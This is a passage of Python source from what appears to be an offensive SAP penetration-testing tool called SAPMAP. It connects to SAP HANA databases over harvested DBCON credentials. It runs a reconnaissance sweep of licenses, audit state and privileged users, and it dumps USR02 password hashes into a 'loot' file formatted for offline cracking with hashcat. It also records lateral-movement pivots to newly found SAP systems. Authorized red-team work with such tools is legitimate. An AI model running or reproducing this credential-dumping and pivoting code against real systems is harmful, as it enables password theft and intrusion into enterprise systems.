        out["error"] = f"invalid schema identifier: {schema!r}"
        return out
    if not _HANA_IDENT_RE.match(table or ""):
        out["error"] = f"invalid table identifier: {table!r}"
        return out
    if edge.dbms != "HDB":
        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
        return out
    if not edge.reachable:
        out["error"] = "edge not reachable"
        return out

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        out["error"] = err
        return out

    kwargs = {
        "address": edge.host, "port": edge.port,
        "user": edge.user, "password": edge.password,
        "autocommit": True, "communicationTimeout": 20000,
    }
    if edge.dbname: kwargs["databaseName"] = edge.dbname

    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        cur = conn.cursor()
        try:
            cur.execute(
                "SELECT COLUMN_NAME, DATA_TYPE_NAME, LENGTH, "
                "IS_NULLABLE, POSITION "
                "FROM SYS.TABLE_COLUMNS "
                "WHERE SCHEMA_NAME=? AND TABLE_NAME=? "
                "ORDER BY POSITION", (schema, table))
            for r in cur.fetchall():
                out["columns"].append({
                    "name":     str(r[0] or ""),
                    "type":     str(r[1] or ""),
                    "len":      int(r[2] or 0),
                    "nullable": (str(r[3]) == "TRUE"),
                    "position": int(r[4] or 0),
                })
            out["ok"] = True
        finally:
            cur.close()
        print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
              f"describe {schema}.{table}: "
              f"{len(out['columns'])} columns")
    except Exception as e:
        code = _hana_error_code(e)
        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
              f"describe {schema}.{table} failed: {out['error']}")
    finally:
        try:
            if conn is not None: conn.close()
        except Exception: pass
    return out


# ============================================================================
# HANA reconnaissance sweep — one-click landscape facts
# ============================================================================

_RECON_QUERIES = [
    ("host_info",
     "SELECT HOST, VALUE FROM M_HOST_INFORMATION "
     "WHERE KEY IN ('build_version', 'build_date', 'sid') LIMIT 20",
     "hostname + build"),
    # SELECT * on the small metadata views — column names differ
    # across HANA releases (M_DATABASE lost ACTIVE_STATUS around
    # HANA 2.0 SP04, M_LICENSE renamed VALID_FROM→START_DATE).  Ask
    # for everything and let the panel show whatever the FM returns.
    ("database",
     "SELECT * FROM M_DATABASE",
     "tenant / MDC info"),
    ("license",
     "SELECT * FROM M_LICENSE",
     "license + HWKEY"),
    ("services",
     "SELECT SERVICE_NAME, PORT, PROCESS_ID FROM M_SERVICES LIMIT 20",
     "running HANA services"),
    ("clients",
     "SELECT DISTINCT MANDT FROM T000 ORDER BY MANDT",
     "SAP client list (if ABAP-shape)"),
    ("audit",
     "SELECT VALUE FROM M_INIFILE_CONTENTS "
     "WHERE FILE_NAME='global.ini' AND SECTION='auditing configuration' "
     "AND KEY='global_auditing_state' LIMIT 1",
     "audit-log state"),
    ("privileged_users",
     "SELECT USER_NAME, CREATOR FROM SYS.USERS "
     "WHERE USER_NAME IN ('SYSTEM', 'SYS', '_SYS_REPO', 'SAPHANADB', "
     "'SAPABAP1', 'SAPSR3') LIMIT 20",
     "known-privileged users present"),
]


def hana_recon_sweep(edge: DBCONConnection) -> dict:
    """Run a battery of HANA reconnaissance queries in one connection
    and populate edge.recon_facts.  Errors on individual queries are
    non-fatal — the fact is stored as {"error": "..."} so the panel
    surfaces WHICH facts were denied."""
    out = {"ok": False, "error": "", "facts": {}}
    if edge.dbms != "HDB":
        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
        return out
    if not edge.reachable:
        out["error"] = "edge not reachable — Test Connection first"
        return out

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        out["error"] = err
        return out

    kwargs = {
        "address": edge.host, "port": edge.port,
        "user": edge.user, "password": edge.password,
        "autocommit": True, "communicationTimeout": 60000,
    }
    if edge.dbname: kwargs["databaseName"] = edge.dbname

    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
          f"HANA recon sweep ({len(_RECON_QUERIES)} queries) against "
          f"{edge.host}:{edge.port}")
    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        for key, sql, note in _RECON_QUERIES:
            cur = conn.cursor()
            try:
                cur.execute(sql)
                rows = cur.fetchall()
                out["facts"][key] = {
                    "columns": [d[0] for d in (cur.description or [])],
                    "rows": [[(str(v) if v is not None else None)
                              for v in r] for r in rows],
                    "count": len(rows),
                }
                print(f"    [+] recon.{key}: {len(rows)} row(s) — {note}")
            except Exception as e:
                code = _hana_error_code(e)
                out["facts"][key] = {
                    "error": f"HANA {code or '?'}: {str(e)[:120]}",
                    "note":  note,
                }
                print(f"    [-] recon.{key}: {out['facts'][key]['error']}")
            finally:
                cur.close()
        out["ok"] = True
        edge.recon_facts = dict(out["facts"])
    except Exception as e:
        code = _hana_error_code(e)
        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
              f"recon sweep aborted: {out['error']}")
    finally:
        try:
            if conn is not None: conn.close()
        except Exception: pass
    return out


# ============================================================================
# USR02 hash dump — one-click extraction to loot/ for offline cracking
# ============================================================================

_SAP_SCHEMA_CANDIDATES = [
    "SAPHANADB", "SAPABAP1", "SAPSR3", "SAP", "SAPQ01", "SAPP01",
    "SAPD01",
]


def _resolve_sap_schema(conn, target_sid: str = "") -> str:
    """Find which schema on this HANA holds USR02.

    Tries release-specific candidates first (SAP<SID>DB / SAP<SID>),
    then generic release-vanilla names, then a SYS.TABLES scan.
    Returns the schema name or "" if not found.
    """
    candidates = list(_SAP_SCHEMA_CANDIDATES)
    if target_sid:
        candidates.insert(0, f"SAP{target_sid.upper()}")
        candidates.insert(0, f"SAP{target_sid.upper()}DB")
    for schema in candidates:
        cur = conn.cursor()
        try:
            cur.execute(
                "SELECT COUNT(*) FROM SYS.TABLES "
                "WHERE SCHEMA_NAME=? AND TABLE_NAME='USR02'",
                (schema,))
            r = cur.fetchone()
            if r and int(r[0]) > 0:
                return schema
        except Exception:
            pass
        finally:
            cur.close()
    cur = conn.cursor()
    try:
        cur.execute(
            "SELECT SCHEMA_NAME FROM SYS.TABLES "
            "WHERE TABLE_NAME='USR02' "
            "AND SCHEMA_NAME NOT LIKE '\\_SYS\\_%' ESCAPE '\\' "
            "LIMIT 1")
        r = cur.fetchone()
        return str(r[0]).strip() if r and r[0] else ""
    finally:
        cur.close()


def dump_usr02_hashes(edge: DBCONConnection,
                        source_node: SAPNode = None,
                        loot_dir: str = "") -> dict:
    """Extract USR02 password hashes (BCODE + PASSCODE + PWDSALTEDHASH)
    via direct SQL and write a hashcat-formatted file to loot/.

    Returns {ok, error, count, hash_types, loot_path}.  Hash file
    format (one row per line):
        BNAME:MANDT:BCODE_HEX:PASSCODE_HEX:PWDSALTEDHASH
    Empty hashes are omitted.  Hashcat modes: BCODE=7900,
    PASSCODE=10300 (with SAP prefix hint), PWDSALTEDHASH is iSSHA
    or PBKDF2-SHA1 depending on kernel.
    """
    import os as _os
    from datetime import datetime as _dt
    out = {"ok": False, "error": "", "count": 0, "loot_path": "",
           "hash_types": {"bcode": 0, "passcode": 0, "pwdsaltedhash": 0}}
    if edge.dbms != "HDB":
        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
        return out
    if not (edge.reachable and edge.is_sap_shape):
        out["error"] = ("edge must be SAP-shape reachable — "
                         "USR02 dump needs USR02 present")
        return out

    dbapi, err = _import_hdbcli()
    if dbapi is None:
        out["error"] = err
        return out

    kwargs = {
        "address": edge.host, "port": edge.port,
        "user": edge.user, "password": edge.password,
        "autocommit": True, "communicationTimeout": 60000,
    }
    if edge.dbname: kwargs["databaseName"] = edge.dbname

    conn = None
    try:
        conn = dbapi.connect(**kwargs)
        schema = _resolve_sap_schema(conn, target_sid=edge.target_sid)
        if not schema:
            out["error"] = ("could not locate USR02 in any known SAP "
                             "schema — tried "
                             f"{_SAP_SCHEMA_CANDIDATES}")
            return out
        print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
              f"dumping USR02 from {schema}.USR02 on {edge.host}")

        cur = conn.cursor()
        rows_extracted = []
        try:
            cur.execute(
                f'SELECT MANDT, BNAME, BCODE, PASSCODE, PWDSALTEDHASH '
                f'FROM "{schema}"."USR02" '
                f'ORDER BY BNAME')
            for r in cur.fetchall():
                mandt = str(r[0] or "").strip()
                bname = str(r[1] or "").strip()
                if not bname:
                    continue
                def _hex(v):
                    if v is None: return ""
                    if isinstance(v, (bytes, bytearray)):
                        return v.hex().upper()
                    return str(v).strip()
                bcode  = _hex(r[2])
                pcode  = _hex(r[3])
                psalt  = str(r[4] or "").strip()
                if bcode:  out["hash_types"]["bcode"] += 1
                if pcode:  out["hash_types"]["passcode"] += 1
                if psalt:  out["hash_types"]["pwdsaltedhash"] += 1
                rows_extracted.append(
                    f"{bname}:{mandt}:{bcode}:{pcode}:{psalt}")
        finally:
            cur.close()

        out["count"] = len(rows_extracted)
        if out["count"] == 0:
            out["error"] = "USR02 SELECT returned 0 rows"
            return out

        if not loot_dir:
            loot_dir = _os.path.join(_os.getcwd(), "loot", "dbcon")
        _os.makedirs(loot_dir, exist_ok=True)
        ts = _dt.utcnow().strftime("%Y%m%d_%H%M%S")
        sid = (edge.target_sid or edge.con_name).upper()
        path = _os.path.join(
            loot_dir, f"usr02_{sid}_{edge.con_name}_{ts}.txt")
        header = (
            f"# SAPMAP DBCON USR02 hash dump\n"
            f"# Source SAP: {edge.source_sid}\n"
            f"# DBCON:      {edge.con_name}\n"
            f"# Target:     {edge.host}:{edge.port} "
            f"(SID={edge.target_sid or '?'}, schema={schema})\n"
            f"# Dumped:     {_dt.utcnow().isoformat()}Z\n"
            f"# Format:     BNAME:MANDT:BCODE_HEX:PASSCODE_HEX:PWDSALTEDHASH\n"
            f"# Rows:       {out['count']}\n"
            f"# BCODE:      {out['hash_types']['bcode']} (hashcat -m 7900)\n"
            f"# PASSCODE:   {out['hash_types']['passcode']} (hashcat -m 10300 with SAP prefix)\n"
            f"# PWDSALTED:  {out['hash_types']['pwdsaltedhash']} (iSSHA / PBKDF2-SHA1)\n"
            f"#\n")
        with open(path, "w") as fh:
            fh.write(header)
            fh.write("\n".join(rows_extracted) + "\n")
        try:
            _os.chmod(path, 0o600)
        except Exception:
            pass
        edge.usr02_hashes_loot_path = path
        out["loot_path"] = path
        out["ok"] = True
        print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
              f"USR02 dump: {out['count']} row(s), "
              f"BCODE={out['hash_types']['bcode']}, "
              f"PASSCODE={out['hash_types']['passcode']}, "
              f"PWDSALTEDHASH={out['hash_types']['pwdsaltedhash']} — "
              f"loot: {path}")
    except Exception as e:
        code = _hana_error_code(e)
        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
              f"USR02 dump failed: {out['error']}")
    finally:
        try:
            if conn is not None: conn.close()
        except Exception: pass
    return out


# ============================================================================
# Materialize DBCON target as a first-class SAP node on the map
# ============================================================================

def materialize_target_as_sap_node(edge: DBCONConnection,
                                     state: SAPMAPState):
    """When the DBCON probe confirms is_sap_shape AND we have a
    target_sid, promote the target from "cylinder on the map" to a
    first-class SAPNode so the normal scan / exploit flow can reach it.

    Idempotent: if a node with the same SID already exists, tag it
    with discovered_via_dbcon (unless already set) and return.
    Otherwise create a new node via state.add_node().  Returns the
    node or None on skip.
    """
    if not (edge.is_sap_shape and edge.target_sid and edge.reachable):
        return None
    target_sid = edge.target_sid.upper().strip()
    if not target_sid:
        return None
    existing = state.get_node(target_sid)
    if existing is not None:
        if not existing.discovered_via_dbcon:
            existing.discovered_via_dbcon = True
            existing.dbcon_parent_sid = edge.source_sid
            existing.dbcon_parent_con_name = edge.con_name
            print(f"[*] materialize_target_as_sap_node: {target_sid} "
                  f"already on map — tagged as discovered_via_dbcon "
                  f"(parent {edge.source_sid}/{edge.con_name})")
        return existing
    node = SAPNode(
        sid=target_sid,
        ip=edge.host,
        hostname=edge.host,
        discovered_via_dbcon=True,
        dbcon_parent_sid=edge.source_sid,
        dbcon_parent_con_name=edge.con_name,
    )
    try:
        state.add_node(node)
        print(f"[+] materialize_target_as_sap_node: new SAPNode "
              f"{target_sid} @ {edge.host} added (via DBCON pivot "
              f"from {edge.source_sid}/{edge.con_name})")
        try:
            from sapmap_findings import emit_finding
            emit_finding(
                "HIGH", edge.source_sid,
                f"DBCON pivot uncovered a new SAP system: "
                f"{target_sid} @ {edge.host}:{edge.port} "
                f"(via /DBCON/{edge.con_name})",
                ref="dbcon.new_sap_system",
                attack_capability="lateral.dbcon_direct")
        except Exception:
            pass
    except Exception as e:
        print(f"[-] materialize_target_as_sap_node: state.add_node "
              f"failed for {target_sid}: {type(e).__name__}: {e}")
        return None
    return node
